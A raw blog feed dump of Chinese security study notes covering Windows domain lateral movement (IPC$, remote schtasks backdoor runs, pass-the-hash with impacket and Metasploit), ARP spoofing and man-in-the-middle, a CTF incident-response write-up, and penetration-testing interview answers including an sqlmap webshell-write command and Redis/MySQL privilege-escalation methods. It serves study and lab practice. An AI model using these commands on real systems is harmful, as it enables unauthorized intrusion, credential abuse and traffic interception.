alt="image-20230330142326253"></p><p>同理域控server2008也可以使用该payload</p><h4 id="ipc-连接"><a href="#ipc-连接" class="headerlink" title="ipc$连接"></a>ipc$连接</h4><blockquote><p><code>IPC$(Internet Process Connection)</code>是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，也就是两个进程之间可以利用它产生数据交互，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p></blockquote><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\ip /u:username password # 建立ipc$连接</span><br><span class="line"><span class="built_in">net</span> view \\ip # 查看目标机器的共享资源</span><br><span class="line"><span class="built_in">net</span> use z: \\IP\c$ # 将目标c盘映射为本地z盘</span><br><span class="line"><span class="built_in">dir</span> \\ip\盘符$\dir_path  # 列出指定目录文件</span><br><span class="line"><span class="built_in">copy</span> \\ip\盘符$\file save_path # 下载文件 save_path为绝对路径/保存到当前目录</span><br><span class="line"><span class="built_in">copy</span> file \\ip\盘符$\file # 复制文件</span><br><span class="line"><span class="built_in">net</span> use \\ip /<span class="built_in">del</span> /y # 删除ipc$连接</span><br></pre></td></tr></table></figure><ul><li><p>版本＜Windows2012</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip # 查看目标机器时间</span><br><span class="line"><span class="built_in">at</span> \\ip <span class="built_in">time</span>(<span class="number">11</span>:<span class="number">12</span>) c:\<span class="number">1</span>.bat # 创建定时任务</span><br></pre></td></tr></table></figure></li><li><p>版本＞Windows2012</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip # 查看目标机器时间</span><br><span class="line"></span><br><span class="line">schtasks /create /tn &quot;task&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st <span class="number">16</span>:<span class="number">32</span> /S ip /RU System /u username /p &quot;passwd&quot;</span><br><span class="line"># 创建该时间之后的某个时刻自动执行任务，任务名 plugin_update</span><br><span class="line"></span><br><span class="line">schtasks /run /tn &quot;task&quot; /S ip /u username /p &quot;passwd&quot;</span><br><span class="line"># 立即运行后门程序</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">schtasks /F /delete /tn &quot;task&quot; /S ip /u username /p &quot;passwd&quot;</span><br><span class="line"># 删除创建的任务</span><br></pre></td></tr></table></figure></li></ul><p>这里添加了用户，用外网机使用ipc$与域控建立连接后，发现没有权限</p><p><img src="/../images/image-20230331151440023-1686283281462.png" alt="image-20230331151440023"></p><p>这是因为权限问题</p><p><a href="https://ares-x.com/2020/03/10/%E5%85%B3%E4%BA%8EIPC%E5%92%8CPTH%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/">关于IPC和PTH用户权限问题 | AresX’s Blog</a></p><blockquote><p>可以建立ipc$连接：</p><ul><li><p>域用户，并且该域用户在远程计算机的管理员组中。</p></li><li><p>本地管理员用户</p></li></ul><p>（如果本地管理员组启用了Administrator，那么本地管理员里只有Administrator是可以连接的）</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user khaz123 khaz777... /add</span><br><span class="line">net localgroup administrators username /add</span><br></pre></td></tr></table></figure><p>将khaz123用户添加到域控的本地管理员组中（因为是域控服务器添加用户，该用户自动为域用户），ipc$连接成功</p><p><img src="/../images/image-20230330235734609-1686283281462.png" alt="image-20230330235734609"></p><h4 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h4><p>同一时刻只能有一个用户登录</p><p><img src="/../images/image-20230331194248211-1686283281462.png" alt="image-20230331194248211"></p><h5 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></table></figure><h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><blockquote><p>实际上post&#x2F;windows&#x2F;manage&#x2F;enable_rdp就是利用了上面windows修改注册表的方式开启3389端口</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br><span class="line">rdesktop ip </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324160952786-1686283281462.png" alt="image-20230324160952786"></p><h4 id="PTH-哈希传递攻击"><a href="#PTH-哈希传递攻击" class="headerlink" title="PTH 哈希传递攻击"></a>PTH 哈希传递攻击</h4><blockquote><p>挑战响应机制，只要知道NTLM哈希，无需知道明文密码，就可以通过认证</p></blockquote><ul><li>impacket</li></ul><p>安装：<code>sudo apt install python3-impacket</code></p><p><img src="/../images/image-20230331172307275-1686283281462.png" alt="image-20230331172307275"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains  xxx.py -hashes :91ff0fb948167eb4d080b5330686c02f  Administrator@192.168.52.138</span><br><span class="line"></span><br><span class="line">psexec.py</span><br><span class="line">smbexec.py</span><br><span class="line">wmiexec.py</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230331172323473-1686283281462.png" alt="image-20230331172323473"></p><p><img src="/../images/image-20230331172427568-1686283281462.png" alt="image-20230331172427568"></p><p><img src="/../images/image-20230331172508321-1686283281462.png" alt="image-20230331172508321"></p><ul><li><p>MSF</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass LM:NTLM</span><br><span class="line">set lhost 192.168.52.143</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><h4 id="PTT票据传递"><a href="#PTT票据传递" class="headerlink" title="PTT票据传递"></a>PTT票据传递</h4><blockquote><p>只要知道了KDC和Server密钥，即可伪造黄金票据和白银票据</p></blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_44159028/article/details/124631522">https://blog.csdn.net/qq_44159028/article/details/124631522</a></p><p><a href="https://blog.51cto.com/u_15127677/4045185">https://blog.51cto.com/u_15127677/4045185</a></p><p><a href="https://soapffz.com/archives/558/">https://soapffz.com/archives/558/</a></p><p><a href="https://xz.aliyun.com/t/2536">后渗透之meterpreter使用攻略 - 先知社区</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ARP协议</title>
      <link href="/2023/06/01/ARP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/06/01/ARP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="ARP协议是什么"><a href="#ARP协议是什么" class="headerlink" title="ARP协议是什么"></a>ARP协议是什么</h2><p>​ARP 协议是地址解析协议。它的作用是，通过IP地址（身份证号），问出MAC地址（名字）。</p><p>​比如说，一个网络，有A、B、C 和 D四个设备，还有一个特殊的设备，它是路由器。每个设备有 IP 地址和 MAC 地址。</p><p><img src="/../images/1658199491_62d61dc3accbdb9a8b4c3-1694328189527.jpg!small" alt="img"><br>    假设，设备A 需要发送数据包给设备C，设备A的应用程序只知道要发送数据给10.0.2.6这个ip，但是发不出去。</p><p>这是因为，IP地址类似身份证号，在全国范围内，它很好用，但在家庭范围内不灵。MAC类似名字，在全国范围内不灵，但家庭内部，还得靠这个。</p><p>​同样，局域网内部通信，也就是通过普通二层交换机通信，IP(身份证号)不灵，得依靠MAC(名字)。A必须知道10.0.2.6的MAC地址，才能将数据包发送出去。然而，设备A怎么知道设备C的MAC呢？这就要依靠 ARP 协议。</p><h2 id="ARP协议如何实现"><a href="#ARP协议如何实现" class="headerlink" title="ARP协议如何实现"></a>ARP协议如何实现</h2><p>​设备A发送一个广播包，它就是ARP 包，问所有设备： 10.0.2.6(身份证号)是谁的？或许有善于思考的人会问，此时A不知道其他机器的mac地址，怎么发数据包？我回答：广播包是普发，既然普发，当然无需知道接收方的mac地址。</p><p><img src="/../images/1658199518_62d61ddead52e7492752c-1694328193352.jpg!small" alt="img"><br>    其他设备都不予理睬，设备C知道自己的IP是10.0.2.6，所以，它立即做出回应。</p><p>​正常情况下，其他的设备都默不作声，只有设备C，它会发出应答包。善于思考的人此时又会问：C不知道A的mac地址，怎么回应？错：A发送的广播包中带有自己的mac地址，所以，C此时已经有了A的mac地址。回应包就像一张身份证：一行是身份证号ip，下一行是姓名mac。就这样，设备A通过询问，拿到了设备C的MAC，二者就可以在局域网中进行通信了。</p><p><img src="/../images/1658199555_62d61e035ce70a9b1f624-1694328196273.jpg!small" alt="img"><br>    这里就出现另一个问题：是不是每发送一次都得经过广播 -&gt; 封装 ARP 响应 -&gt; 返回给主机这一系列流程呢？</p><p>​答案是：ARP表</p><p>​主机通过把第一次 ARP 获取到的 MAC 地址作为 IP 对 MAC 的映射关系到一个 ARP 缓存表中，下一次再向这个地址发送数据报时就不再需要重新发送 ARP 请求了，而是直接使用这个缓存表中的 MAC 地址进行数据报的发送。</p><h2 id="ARP数据包"><a href="#ARP数据包" class="headerlink" title="ARP数据包"></a>ARP数据包</h2><p>实验环境：宿主机window10，虚拟机kaii（net连接）</p><p>工具：wireshark</p><p>选择捕获VMnet8网卡。</p><p>在宿主机上<code>ping 192.168.244.128</code> （ping 虚拟机ip地址），过滤ARP协议得到</p><p><img src="/../images/image-20220929154825833-1694328200254.png" alt="image-20220929154825833"></p><p>可以看到info的信息其实就告诉我们了ARP协议是用来干嘛的。</p><p>数据包内容，以ARP请求为例：</p><p><img src="/../images/image-20220929155056878-1694328203114.png" alt="image-20220929155056878"></p><ol><li><p>第一帧描述了ARP数据包的长度，时间，类型等信息。</p><p><img src="/../images/image-20220929155151496.png" alt="image-20220929155056878"></p></li><li><p>第二帧描述了源mac地址和目标mac地址</p><p>其中目的地址<code>ff:ff:ff:ff:ff:ff</code>为广播地址</p><p><img src="/../images/image-20220929155258245.png" alt="image-20220929155056878"></p></li><li><p>第三帧</p><blockquote><p>引用图片</p></blockquote><p><img src="/../images/1657258276_62c7c1240a8a324d48f7b-1694328215300.png!small" alt="1657258276_62c7c1240a8a324d48f7b.png!small"></p></li></ol><p>ARP响应包主要不同点就在于ARP数据包类型以及源，目标地址。</p><p><img src="/../images/image-20220929155642126-1694328218908.png" alt="image-20220929155642126"></p><h2 id="ARP协议探测主机"><a href="#ARP协议探测主机" class="headerlink" title="ARP协议探测主机"></a>ARP协议探测主机</h2><blockquote><p>因为ARP的工作流程，所以可以用来探测主机。</p></blockquote><p>使用netdiscover工具进行探测</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.244.1/24</span><br></pre></td></tr></table></figure><p>下图为另一台虚拟机ubuntu的ip地址</p><p><img src="/../images/image-20220929150651695-1694328222991.png" alt="image-20220929150651695"></p><p>下图为命令执行结果</p><p><img src="/../images/image-20220929150631230-1694328225340.png" alt="image-20220929150631230"></p><p>192.168.244.1为本机</p><p>192.168.244.2为VM网关</p><p>192.168.244.129为同一局域网下的主机</p><p>192.168.244.254为VM？</p><h2 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h2><h3 id="欺骗攻击"><a href="#欺骗攻击" class="headerlink" title="欺骗攻击"></a>欺骗攻击</h3><h4 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h4><p>ARP的特性</p><blockquote><p>设备就算没有主动去询问（发广播包），也会接收别人主动发来的身份诊卡（ARP回应包）。</p><p>并且接收时不会去判断真假，而是直接保存到ARP表中。</p></blockquote><h4 id="欺骗主机"><a href="#欺骗主机" class="headerlink" title="欺骗主机"></a>欺骗主机</h4><p>Victim：虚拟机ububtu正常联网</p><p><img src="/../images/image-20220929151256047-1694328229283.png" alt="image-20220929151256047"></p><p>hacker：kali机使用arpspoof工具进行ARP欺骗攻击</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arpspoof -i 网卡名 -t  目标主机  路由器</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220929151906826-1694328232862.png" alt="image-20220929151906826"></p><p>命令的结果就是让Victim的ARP表中存储的路由器mac地址变为hacker的mac地址，即发送的数据包会到hacker主机，而不是到路由器。</p><p>从下图可以看到victim无法访问网站，并且通过命令<code>arp -a</code>查看ARP表会发现VM网关（192.168.244.2）的mac地址和hacker的mac地址是一样的，所以ARP欺骗攻击成功了。</p><p><img src="/../images/image-20220929151847725-1694328235790.png" alt="image-20220929151847725"></p><h4 id="中间人攻击–欺骗网关和主机"><a href="#中间人攻击–欺骗网关和主机" class="headerlink" title="中间人攻击–欺骗网关和主机"></a>中间人攻击–欺骗网关和主机</h4><p>​在上面的基础上，hacker还可以再对路由器进行ARP欺骗攻击，让路由器中Victim的ip所对应的MAC地址变为hacker的MAC地址，这样当Victim发送数据包的时候就会先发送到hacker手上，hacker可以把数据包再给路由器，当路由器收到响应的数据包时，就会转发给hacker，这样hacker就能够监控并更改Victim的通信了。</p><p><img src="/../images/1658199907_62d61f63394a1350fb977-1694328238721.jpg!small" alt="img"></p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li>绑定mac地址</li><li>使用静态arp缓存表</li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/vuls/338603.html">ARP协议</a></p><p><a href="https://www.freebuf.com/articles/network/339512.html">ARP欺骗</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机网络</title>
      <link href="/2023/06/01/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2023/06/01/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<p><a href="https://wxler.github.io/2021/02/02/221724/">https://wxler.github.io/2021/02/02/221724/</a></p><p>VM网络配置</p><p><img src="/../images/image-20221130222647414-1694328507984.png" alt="image-20221004160123895"></p><p>虚拟机win10打印的网络配置信息</p><p><img src="/../images/image-20221130222502342-1694328517756.png" alt="image-20221004160123895"></p><p>宿主机网络设备</p><p><img src="/../images/image-20221130223635941-1694328542057.png" alt="image-20221004160123895"></p><p>NAT模式</p><p><img src="/../images/20210202174313-1694328313538.png" alt="img"></p><p>桥接模式</p><p><img src="/../images/20210202175608-1694328316191.png" alt="img"></p><p>仅主机模式</p><p><img src="/../images/20210202181232-1694328318816.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bugku 应急响应</title>
      <link href="/2023/05/31/bugku%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2023/05/31/bugku%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h3 id="js劫持"><a href="#js劫持" class="headerlink" title="js劫持"></a>js劫持</h3><p><img src="/../images/image-20230402174621652-1686151030355.png" alt="image-20230402174621652"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `find /var/www/html -name &quot;6127418cad73c.php&quot;`</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230402174633296-1686151030358.png" alt="image-20230402174633296"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . | xargs grep -ri &#x27;&lt;script type=&quot;text/javascript&quot;&gt;&#x27; -l | sort | uniq -c</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过xss的特征内容来定位可疑文件</p><h3 id="反弹shell后门"><a href="#反弹shell后门" class="headerlink" title="反弹shell后门"></a>反弹shell后门</h3><p><img src="/../images/image-20230402180138838-1686151030359.png" alt="image-20230402180138838"></p><p><img src="/../images/image-20230402180201438-1686151030359.png" alt="image-20230402180201438"></p><p>处理：</p><p>删除文件</p><p>杀掉进程</p><h3 id="命令劫持"><a href="#命令劫持" class="headerlink" title="命令劫持"></a>命令劫持</h3><p><img src="/../images/image-20230402180338299-1686151030359.png" alt="image-20230402180338299"></p><h3 id="数据库修复"><a href="#数据库修复" class="headerlink" title="数据库修复"></a>数据库修复</h3><p><a href="https://www.cnblogs.com/richardzhu/p/3318595.html">MySQL之权限管理 - I’m Me! - 博客园</a></p><p><img src="/../images/image-20230402181706798-1686151030359.png" alt="image-20230402181706798"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">revoke file on *.* from &#x27;root&#x27;@&#x27;localhost&#x27;; # 收回文件权限</span><br><span class="line">set global general_log = off; # 不启用日志</span><br><span class="line">flush privileges; # 刷新权限</span><br></pre></td></tr></table></figure><h3 id="用户删除"><a href="#用户删除" class="headerlink" title="用户删除"></a>用户删除</h3><p><img src="/../images/image-20230402183352852-1686151030359.png" alt="image-20230402183352852"></p><p>直接删就完事了</p><h3 id="首次攻击"><a href="#首次攻击" class="headerlink" title="首次攻击"></a>首次攻击</h3><p>筛选了ip和状态码，然后找的。</p><p><img src="/../images/image-20230402190333789-1686151030360.png" alt="image-20230402190333789"></p><p><img src="/../images/image-20230403114840046-1686151030360.png" alt="image-20230403114840046"></p><p><img src="/../images/image-20230403114851126-1686151030360.png" alt="image-20230403114851126"></p><p>发现安装了phpmyadmin，那么很大概率是通过数据库攻入的。</p><p><img src="/../images/image-20230403115435870-1686151030360.png" alt="image-20230403115435870"></p><p>登录phpmyadmin后台查看二进制日志，很明显看出来这个是使用udf创建恶意函数sys_eval提权</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看这些目录是否有文件，很可能有提权</span><br><span class="line">mysql\lib\plugin</span><br><span class="line"></span><br><span class="line">c:<span class="operator">/</span>windows<span class="operator">/</span>system32<span class="operator">/</span>wbem<span class="operator">/</span>mof<span class="operator">/</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230403115606245-1686151030360.png" alt="image-20230403115606245"></p><p>修复</p><p><img src="/../images/image-20230403123447079-1686151030360.png" alt="image-20230403123447079"></p><p>在my.ini中添加如上设置，不允许导入和导出。</p><p>进行mysql日志分析，通过定位sys_eval来查找攻击者进行了哪些操作</p><p><img src="/../images/image-20230403120034903-1686151030360.png" alt="image-20230403120034903"></p><p>只进行了添加用户的操作</p><p><img src="/../images/image-20230403120253606-1686151030360.png" alt="image-20230403120253606"></p><p>直接删除该用户</p><p><img src="/../images/image-20230403120327311-1686151030360.png" alt="image-20230403120327311"></p><p>查杀websehll</p><p>使用日志分析工具</p><p>（跟踪ip的访问）</p><p><img src="/../images/image-20230403122636304-1686151030360.png" alt="image-20230403122636304"></p><p><img src="/../images/image-20230403122604222-1686151030360.png" alt="image-20230403122604222"></p><p>后门查杀</p><p><img src="/../images/image-20230403124818101-1686151030361.png" alt="image-20230403124818101"></p><p><img src="/../images/image-20230403124754804-1686151030361.png" alt="image-20230403124754804"></p><p>木马位置在启动项</p><p><img src="/../images/image-20230403124903028-1686151030361.png" alt="image-20230403124903028"></p><p><img src="/../images/image-20230403124408821-1686151030361.png" alt="image-20230403124408821"></p><p>通过资源监视器得到该木马外联地址</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面经</title>
      <link href="/2023/05/31/%E9%9D%A2%E7%BB%8F/"/>
      <url>/2023/05/31/%E9%9D%A2%E7%BB%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><ul><li>在渗透过程中，收集目标站注册人邮箱对我们有什么价值？</li></ul><p>(1)丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台</p><p>(2)用邮箱做关键词进行丢进搜索引擎</p><p>(3)利用搜索到的关联信息找出其他邮箱进而得到常用社交账号</p><p>(4)社工找出社交账号，里面或许会找出管理员设置密码的习惯</p><p>(5)利用已有信息生成专用字典</p><p>(6)观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西</p><ul><li><p>信息收集如何处理子域名爆破的泛解析问题？</p><p><img src="/../images/image-20230616165230965.png" alt="image-20230616165230965"></p></li><li><p>如何绕过CDN找到真实IP，请列举五种方法 (★★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">国外ping，因为大多数企业不会在国外搭设CDN</span><br><span class="line">DNS解析记录，可以找未搭设CDN时的ip</span><br><span class="line">二级域名法，因为可能只给主站搭设了CDN</span><br><span class="line">历史域名法，不使用的旧域名通常不会有CDN，并且没有过期的话就可以</span><br><span class="line">邮箱法，邮箱服务器真实ip</span><br></pre></td></tr></table></figure></li><li><p>redis未授权访问如何利用，利用的前提条件是? (★★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">绝对路径写入webshell</span><br><span class="line">ssh公钥：需要存在.ssh目录</span><br><span class="line">crontab定时任务：低版本redis（才会是root权限），系统为Centos（因为redis写文件644，ubuntu要执行定时任务必须600）</span><br><span class="line"></span><br><span class="line">主从复制：是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</span><br><span class="line">通过同步功能，将恶意os文件复制到从节点达到RCE</span><br></pre></td></tr></table></figure></li><li><p>mysql提权方式有哪些?利用条件是什么? (★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mof : windows server 2003 mof脚本被系统定时执行，写入恶意vbs脚本</span><br><span class="line">udf ： 用户自定义函数，导入恶意dll从而RCE</span><br><span class="line">Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</span><br><span class="line">Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</span><br><span class="line"></span><br><span class="line">启动项提权</span><br><span class="line">反弹shell</span><br></pre></td></tr></table></figure></li><li><p>windows+mysql，存在sql注入，但是机器无外网权限，可以利用吗? (★)</p></li><li><p>常用的信息收集手段有哪些，除去<code>路径扫描</code>，<code>子域名爆破</code>等常见手段，有什么猥琐的方法收集企业信息? (★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">见渗透测试流程</span><br></pre></td></tr></table></figure></li><li><p><code>SRC挖掘</code>与<code>渗透测试</code>的区别是什么，针对这两个不同的目标，实施过程中会有什么区别 (★★)</p><p><img src="/../images/image-20230404125508806-1686810531409.png" alt="image-20230404125508806"></p></li><li><p>存储xss在纯内网的环境中，可以怎么利用？(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xss本质上是任意js代码执行，xss可以修改网站页面，甚至可以扫描端口，如果你也在内网，可以嗅探密码等等。</span><br></pre></td></tr></table></figure></li><li><p>mssql中，假设为sa权限，如何不通过<code>xp_cmdshell</code>执行系统命令 (★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sp_oacreate</span><br><span class="line">CLR</span><br></pre></td></tr></table></figure></li><li><p>假设某网站存在waf，不考虑正面绕过的前提下，应该如何绕过(分情况讨论 云waf&#x2F;物理waf) (★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">云waf，绕过域名解析，找到真实ip；</span><br><span class="line"></span><br><span class="line">物理waf，前后端解析不一致如编码绕过，多数据来源绕过，参数污染，http协议绕过如分块传输.畸形请求方式，长连接，chrest编码，waf性能如脏数据，高并发，waf机制如白名单绕过，静态文件绕过</span><br></pre></td></tr></table></figure></li></ul><h2 id="Web安全相关"><a href="#Web安全相关" class="headerlink" title="Web安全相关"></a>Web安全相关</h2><ul><li><p>介绍一下自认为有趣的挖洞经历（或CTF经历）(★★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssrf+redis</span><br><span class="line"></span><br><span class="line">打开网站是一个翻译界面，url过滤不充分，dict,file等协议都过滤了，但是没有过滤http协议。直接用burp的intruder模块爆破以下，发现有一个主机存活，然后再对这个主机进行端口扫描，6379端口开放。redis服务需要认证，爆破脚本，需要先了解redis的通信协议，将数据包构造成redis能理解的协议。</span><br><span class="line"></span><br><span class="line">php session反序列化，通过切换php session序列化模式，从而导致反序列化getshell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">src</span><br><span class="line"></span><br><span class="line">先信息收集，用fofa的证书语法cert搜索到网站，是一个商城系统，然后测试了一下搜索框，加入引号，发现出现了报错，然后想用xpath函数来进行注入，发现函数被过滤了，看那个网站回显应该是安全狗，然后fuzz了一下，发现不能出现括号还有select from连用，用内联注释，插入脏字符和换行+注释绕过了，就写了个tamper脚本开跑。然后收集了信息，发现这个是网站和数据库都在一个服务器上，并且sec_file_rev为空，所以就可以尝试写shell，但是不知道网站的绝对路径，通过读取apache的配置文件得到了网站的绝对路径，就可以写入了，到这就没有继续测试了。</span><br></pre></td></tr></table></figure></li><li><p>CSRF的成因及防御措施（不用token如何解决) (★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">成因：web应用程序在用户进行敏感操作时，没有进行身份验证</span><br><span class="line">防御措施：</span><br><span class="line">- 设置Token</span><br><span class="line">- 检验 referer来源</span><br><span class="line">- 加入验证码等</span><br></pre></td></tr></table></figure></li><li><p>CSRF漏洞中jsonp跟cors的跨域区别？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jsonp只支持get方式的跨域方式</span><br><span class="line">cors支持get和post请求方式</span><br></pre></td></tr></table></figure></li><li><p>SSRF的成因及防御措施 (★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">成因：对于请求的url没有进行严格的过滤和限制 ,导致攻击者可以构造恶意的url </span><br><span class="line">防御措施：禁止跳转，对远程服务器的响应做严格的过滤和限制，白名单：请求的ip地址和端口</span><br></pre></td></tr></table></figure></li><li><p>SSRF如何探测非HTTP协议(★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以使用gopher，dict，curl，file等协议</span><br></pre></td></tr></table></figure></li><li><p>简述一下SSRF的绕过手法(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求的url上</span><br><span class="line">-127.0.0.1变形</span><br><span class="line">-字符欺骗</span><br><span class="line">-DNSRebind</span><br><span class="line">-@#绕过，url解析</span><br></pre></td></tr></table></figure></li><li><p>简述一下SSRF中DNSRebind的绕过原理及修复方法(★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域名解析的a记录有两个，就可以解析到127.0.0.1</span><br><span class="line"></span><br><span class="line">修复方法：</span><br><span class="line">配置本地DNS服务器，避免使用公共DNS服务器</span><br><span class="line">增强认证授权机制,访问时需要其他认证</span><br></pre></td></tr></table></figure></li><li><p>介绍 SQL 注入漏洞成因，如何防范？注入方式有哪些？除了拖取数据库数据，利用方式还有哪些？(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">成因：服务器将用户提交的参数错误地拼接到sql语句中，打破了数据区域的边界（数字型不需要）改变了原有的sql执行逻辑，导致攻击者可以执行恶意的sql语句。</span><br><span class="line"></span><br><span class="line">防范：预编译（加了单引号，字段名→字符串）+白名单</span><br><span class="line"></span><br><span class="line">注入方式：联合，报错，堆叠，时间盲注，布尔盲注，order by</span><br><span class="line"></span><br><span class="line">其他：</span><br><span class="line">读写文件 （变量值，物理路径，权限）</span><br><span class="line"></span><br><span class="line">日志getshell</span><br><span class="line"></span><br><span class="line">数据库提权：</span><br><span class="line">mysql-UOF,UDF </span><br><span class="line">sqlserver:XP_CMDSHELL,sp_oacreate</span><br><span class="line"></span><br><span class="line">cilent端任意文件读取（对方有数据库外连）</span><br><span class="line"></span><br><span class="line">dns外带</span><br></pre></td></tr></table></figure></li><li><p>如何通过sql注入写shell,写shell的前提条件是什么?(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">写文件：</span><br><span class="line">selct &quot;shell&quot;  into  outfile  &quot;绝对路径&quot;；</span><br><span class="line">sqlmap:</span><br><span class="line">sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;/Users/guang/Desktop/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot;</span><br><span class="line"></span><br><span class="line">日志getshell</span><br><span class="line"></span><br><span class="line">前提条件：</span><br><span class="line">知道网站物理路径</span><br><span class="line">高权限数据库用户</span><br><span class="line">secure_file_priv 为空</span><br></pre></td></tr></table></figure></li><li><p>介绍一下XSS漏洞的种类，dom型XSS和反射XSS的区别是什么?(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反射型，存储型，dom型</span><br><span class="line">dom型与后端无关只经过前端，反射型需要和后端交互</span><br></pre></td></tr></table></figure></li><li><p>如何防范 XSS 漏洞，在前端如何做，在后端如何做，哪里更好，为什么？(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">html实体转义</span><br></pre></td></tr></table></figure></li><li><p>讲述一下找回密码可能涉及的逻辑漏洞(★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以重置任意用户密码</span><br></pre></td></tr></table></figure></li><li><p>假设你是甲方的一名安全工程师，应该如何降低逻辑漏洞的出现率?(★★)</p></li><li><p>oauth认证过程中可能会出现什么问题，导致什么样的漏洞?(★)</p></li><li><p>CSP应该如何使用及配置，有哪些绕过CSP的方式(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p>已知某网站存在LFI(本地文件包含)，但是无法上传任何文件，针对该情况有哪些利用方式?(★★)</p><figure class="highlight plaintext"><table><tr><td 